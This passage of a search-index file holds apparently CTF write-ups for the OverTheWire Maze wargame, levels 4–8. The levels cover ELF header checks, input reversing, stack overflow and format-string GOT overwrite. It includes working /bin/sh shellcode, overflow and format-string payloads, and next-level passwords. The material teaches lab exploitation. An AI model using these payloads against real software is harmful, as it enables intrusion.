execv(argv[1], NULL);          // Execute if valid\n</code></pre> <p>\ud83d\udd0d Key conditions:</p> <ul> <li> <p><code>phdr.p_paddr == e_ident[8] * e_ident[7]</code></p> </li> <li> <p>File size <code>&lt; 120 bytes</code></p> </li> </ul>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%204%20%E2%86%92%20Level%205/#strategy","title":"\ud83e\uddea Strategy","text":"<p>We'll create a file that:</p> <ul> <li> <p>Contains a shell script (<code>/bin/sh</code>)</p> </li> <li> <p>Places crafted values in <code>e_ident[7]</code> and <code>e_ident[8]</code> so their product = <code>phdr.p_paddr</code></p> </li> <li> <p>Aligns offset for <code>phdr</code> using NOPs or junk</p> </li> <li> <p>Keeps total size under 120 bytes</p> </li> </ul>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%204%20%E2%86%92%20Level%205/#exploit-payload","title":"\u2699\ufe0f Exploit Payload","text":"<pre><code>python3 -c '\nprint(\n    \"#!/bin/sh\\n/bin/sh\\n\" +\n    \"A\"*10 +\n    \"\\x20\\x00\\x00\\x00\" +    # e_phoff = 0x20\n    \"B\"*12 +\n    \"\\xb8\\x2e\\x00\\x00\" +    # phdr.p_paddr = 0x2eb8 = 0x68 * 0x73\n    \"B\"*16\n)' &gt; /tmp/hello\n</code></pre> <p>Explanation:</p> <ul> <li> <p><code>\"h\"</code> = <code>0x68</code>, <code>\"s\"</code> = <code>0x73</code> \u2192 <code>0x68 * 0x73 = 0x2eb8</code></p> </li> <li> <p>ELF fields <code>e_ident[7] = 0x73</code>, <code>e_ident[8] = 0x68</code></p> </li> <li> <p><code>e_phoff</code> = 0x20 ensures program header starts at correct offset</p> </li> <li> <p>Junk padding aligns the headers</p> </li> </ul>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%204%20%E2%86%92%20Level%205/#execute-the-exploit","title":"\u25b6\ufe0f Execute the Exploit","text":"<pre><code>/maze/maze4 /tmp/hello\n</code></pre> <p>If successful, it passes all validation checks and gives you a shell \ud83d\udc1a</p>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%204%20%E2%86%92%20Level%205/#password-for-maze-level-5","title":"\ud83d\udd11 Password for Maze Level 5:","text":"<pre><code>ishipaeroo\n</code></pre>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%205%20%E2%86%92%20Level%206/","title":"Level 5 \u2192 6","text":"<p>Challenge URL: Maze Wargame</p>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%205%20%E2%86%92%20Level%206/#level-goal","title":"\ud83d\udd10 Level Goal:","text":"<p>The binary asks for a username and a key, and executes a hidden function only if certain transformations of these values match expected results. Your objective is to reverse the logic inside a custom function and input the correct pair to spawn a shell.</p>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%205%20%E2%86%92%20Level%206/#concepts-covered","title":"\ud83e\udde0 Concepts Covered:","text":"<ul> <li> <p>\ud83e\uddf5 Anti-debugging with <code>ptrace</code></p> </li> <li> <p>\ud83d\udd0d Reversing character transformations</p> </li> <li> <p>\ud83e\udde0 Understanding loop-based character checks</p> </li> <li> <p>\ud83c\udfaf Supplying exact values to satisfy verification logic</p> </li> </ul>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%205%20%E2%86%92%20Level%206/#binary-logic-summary","title":"\ud83d\udd0e Binary Logic Summary","text":""},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%205%20%E2%86%92%20Level%206/#prompt","title":"Prompt:","text":"<pre><code>X----------------\nUsername:\nKey:\n</code></pre>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%205%20%E2%86%92%20Level%206/#validation-flow","title":"Validation Flow:","text":"<ol> <li> <p>Username and Key must both be 8 characters long</p> </li> <li> <p><code>ptrace(PTRACE_TRACEME)</code> is used to block debugging tools like <code>gdb</code></p> </li> <li> <p>If not being debugged \u2192 proceeds to the <code>foo()</code> function</p> </li> </ol>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%205%20%E2%86%92%20Level%206/#reconstructed-logic-from-foo","title":"\ud83d\udcdc Reconstructed Logic from <code>foo()</code>","text":"<pre><code>char p[9] = {0x70, 0x72, 0x69, 0x6e, 0x74, 0x6c, 0x6f, 0x6c}; // = \"printlol\"\nfor (int i = 0; i &lt; 8; ++i) {\n    p[i] -= user[i] + 2 * i - 0x41;\n}\nwhile (i--) {\n    if (pass[i] != p[i]) return 0;\n}\nreturn 1;\n</code></pre> <p>We must ensure:</p> <pre><code>user[i] + 2*i - 0x41 == 0\n\u21d2 user[i] = 0x41 - 2*i\n</code></pre>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%205%20%E2%86%92%20Level%206/#calculated-inputs","title":"\ud83e\uddea Calculated Inputs","text":"<p>Username:</p> <pre><code>user[i] = 0x41 - 2*i\n</code></pre> i Calculation Char 0 0x41 - 0 A 1 0x41 - 2 = 0x3F ? 2 0x41 - 4 = 0x3D = 3 0x41 - 6 = 0x3B ; 4 0x41 - 8 = 0x39 9 5 0x41 - 10 = 0x37 7 6 0x41 - 12 = 0x35 5 7 0x41 - 14 = 0x33 3 <p>\u2705 Username = <code>A?=;9753</code></p> <p>Password = <code>printlol</code> (from hardcoded array)</p>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%205%20%E2%86%92%20Level%206/#execution","title":"\u25b6\ufe0f Execution","text":"<p>Run the binary and input:</p> <pre><code>Username: A?=;9753\nKey: printlol\n</code></pre> <p>You\u2019ll receive:</p> <pre><code>Yeh, here's your shell\n</code></pre> <p>Shell spawns \ud83d\udc1a</p>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%205%20%E2%86%92%20Level%206/#password-for-maze-level-6","title":"\ud83d\udd11 Password for Maze Level 6:","text":"<pre><code>epheghuoli\n</code></pre>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%206%20%E2%86%92%20Level%207/","title":"Level 6 \u2192 7","text":"<p>Challenge URL: Maze Wargame</p>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%206%20%E2%86%92%20Level%207/#level-goal","title":"\ud83d\udd10 Level Goal:","text":"<p>This binary reads ELF header data and calls a custom <code>Print_Shdrs()</code> function to dump section headers. The vulnerability lies in how it reads into a stack-based buffer without bounds checking, leading to a classic stack buffer overflow \u2014 which we\u2019ll exploit to hijack execution flow.</p>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%206%20%E2%86%92%20Level%207/#concepts-covered","title":"\ud83e\udde0 Concepts Covered:","text":"<ul> <li> <p>\ud83e\udde0 ELF header structure: <code>Elf32_Ehdr</code>, <code>Elf32_Shdr</code></p> </li> <li> <p>\ud83e\udde8 Buffer overflow via unsafe <code>read()</code></p> </li> <li> <p>\ud83d\udc1a Shellcode via environment variable</p> </li> <li> <p>\ud83d\udce6 Stack manipulation and return address control</p> </li> </ul>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%206%20%E2%86%92%20Level%207/#decompiled-summary","title":"\ud83d\udd0e Decompiled Summary","text":"<p>In <code>main()</code>:</p> <pre><code>read(fd, &amp;ehdr, 52); // Read ELF header\nPrint_Shdrs(fd, ehdr.e_shoff, ehdr.e_shstrndx, ehdr.e_shnum, ehdr.e_shentsize);\n</code></pre> <p>Inside <code>Print_Shdrs()</code>:</p> <pre><code>char *p = &amp;dummy;        // dummy is char dummy[64];\n...\nread(fd, p, size);       // \ud83e\udde8 size is user-controlled \u2014 unsafe!\n</code></pre> <p>\u2192 If we pass a file with <code>e_shentsize = 0x44</code>, it will cause the <code>read()</code> to overflow the dummy buffer (64 bytes) and overwrite the return address.</p>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%206%20%E2%86%92%20Level%207/#strategy","title":"\ud83e\uddea Strategy","text":"<ol> <li> <p>Place shellcode in an environment variable</p> </li> <li> <p>Craft ELF file with:</p> <ul> <li> <p>Padding for 44-byte overflow</p> </li> <li> <p>Overwritten return address pointing to shellcode</p> </li> </ul> </li> <li> <p>Pass it to the binary</p> </li> </ol>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%206%20%E2%86%92%20Level%207/#step-by-step-exploit","title":"\u2699\ufe0f Step-by-Step Exploit","text":""},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%206%20%E2%86%92%20Level%207/#1-export-shellcode-in-environment","title":"\ud83d\udcdc 1. Export shellcode in environment","text":"<pre><code>export SC=$(python3 -c 'print(\"\\x90\"*100 + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\" \\\n\"\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\")')\n</code></pre> <p>\ud83d\udccc Shellcode address = <code>0xffffdf0c</code></p>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%206%20%E2%86%92%20Level%207/#2-create-payload-elf-file","title":"\ud83d\udcdc 2. Create payload ELF file","text":"<pre><code>python3 -c '\nprint(\n    \"\\x00\"*32 +               # padding\n    \"\\x00\\x00\\x00\\x00\" +      # shstrndx (0)\n    \"\\x00\"*10 + \n    \"\\x44\\x00\" +              # e_shentsize = 0x44\n    \"\\x00\\x00\" +              # e_shnum = 0\n    \"\\x00\\x00\\x00\\x00\" + \n    \"\\x00\"*10 +\n    \"\\x0c\\xdf\\xff\\xff\"        # Overwrite return addr \u2192 0xffffdf0c\n)' &gt; /tmp/elf_payload\n</code></pre>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%206%20%E2%86%92%20Level%207/#3-run-the-exploit","title":"\u25b6\ufe0f 3. Run the Exploit","text":"<pre><code>/maze/maze6 /tmp/elf_payload\n</code></pre> <p>\u2192 The overflow causes return into our NOP sled \u2192 shell spawns \ud83d\udc1a</p>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%206%20%E2%86%92%20Level%207/#password-for-maze-level-7","title":"\ud83d\udd11 Password for Maze Level 7:","text":"<pre><code>pohninieng\n</code></pre>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%207%20%E2%86%92%20Level%208/","title":"Level 7 \u2192 8","text":"<p>Challenge URL: Maze Wargame</p>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%207%20%E2%86%92%20Level%208/#level-goal","title":"\ud83d\udd10 Level Goal:","text":"<p>This level runs a socket server on port 1337 that receives input and sends a reply. If the input matches <code>\"god\"</code>, it sends a generic message. If not, it executes <code>snprintf()</code> with your input as the format string \u2014 making it vulnerable to a format string exploit.</p>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%207%20%E2%86%92%20Level%208/#concepts-covered","title":"\ud83e\udde0 Concepts Covered:","text":"<ul> <li> <p>\ud83e\uddf5 Socket communication</p> </li> <li> <p>\ud83e\udde9 Format string exploitation (<code>%n</code>, <code>%hn</code>)</p> </li> <li> <p>\ud83d\udccc GOT overwrite to redirect execution</p> </li> <li> <p>\ud83d\udc1a Shellcode in environment</p> </li> </ul>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%207%20%E2%86%92%20Level%208/#binary-summary","title":"\ud83d\udd0e Binary Summary","text":"<pre><code>if (strcmp(buf, \"god\") == 0) {\n    strcpy(replybuf, \"Yup... go away\");\n} else {\n    snprintf(replybuf, 512, buf);     // \u26a0\ufe0f Format string vuln!\n    strcat(replybuf, \" is wrong ^_^\");\n}\nsend(client_sock, replybuf, strlen(replybuf), 0);\n</code></pre> <p>\u2705 Since the format string is not sanitized, and our input becomes its format string, we can use <code>%n</code> or <code>%hn</code> to write arbitrary values.</p>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%207%20%E2%86%92%20Level%208/#exploit-plan","title":"\ud83e\uddea Exploit Plan","text":"<ol> <li> <p>Find the GOT address of a function like <code>strlen@GOT</code></p> </li> <li> <p>Overwrite it to point to our shellcode in env</p> </li> <li> <p>Trigger a call to that function (indirectly or by alignment)</p> </li> <li> <p>Shell executes</p> </li> </ol>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%207%20%E2%86%92%20Level%208/#shellcode-setup","title":"\u2699\ufe0f Shellcode Setup","text":""},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%207%20%E2%86%92%20Level%208/#1-export-shellcode-to-env","title":"\ud83d\udcdc 1. Export shellcode to env:","text":"<pre><code>export SC=$(python3 -c 'print(\"\\x90\"*100 + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\" \\\n\"\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\")')\n</code></pre> <p>\ud83e\udde0 Shellcode location: <code>0xffffdf0c</code></p>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%207%20%E2%86%92%20Level%208/#memory-addressing","title":"\ud83e\udde0 Memory Addressing","text":"<p>Assume <code>strlen@GOT = 0x08049d34</code></p> <p>We'll split <code>0xffffdf0c</code> into:</p> <ul> <li> <p>Lower bytes (LO): <code>0xdf0c</code></p> </li> <li> <p>Higher bytes (HI): <code>0xffff</code></p> </li> </ul> <p>Then we\u2019ll write it to:</p> <ul> <li> <p><code>0x08049d34</code> (LO)</p> </li> <li> <p><code>0x08049d36</code> (HI)</p> </li> </ul>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%207%20%E2%86%92%20Level%208/#2-craft-format-string-payload","title":"\ud83d\udcdc 2. Craft Format String Payload","text":"<pre><code>python3 -c 'print(\n  \"\\x34\\x9d\\x04\\x08\" +     # addr of GOT (LO)\n  \"\\x36\\x9d\\x04\\x08\" +     # addr of GOT+2 (HI)\n  \"%57092x%1$hn\" +         # write LO (0xdf0c)\n  \"%8435x%2$hn\"            # write HI (0xffff)\n)' | nc localhost 1337\n</code></pre> <p>Calculations:</p> <ul> <li> <p><code>0xdf0c = 57092</code></p> </li> <li> <p><code>0xffff - 0xdf0c = 8435</code></p> </li> <li> <p><code>$1</code>, <code>$2</code> are argument positions for addresses on the stack</p> </li> </ul>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%207%20%E2%86%92%20Level%208/#trigger","title":"\ud83e\uddea Trigger","text":"<p>In one terminal:</p> <pre><code>/maze/maze7\n</code></pre> <p>In another:</p> <pre><code>python3 ... | nc localhost 1337\n</code></pre> <p>\ud83e\udde8 When <code>snprintf()</code> is called, our payload overwrites <code>strlen()</code> GOT entry \u2192 control jumps to shellcode \u2192 shell spawns!</p>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%207%20%E2%86%92%20Level%208/#password-for-maze-level-8","title":"\ud83d\udd11 Password for Maze Level 8:","text":"<pre><code>jopieyahng\n</code></pre>"}]}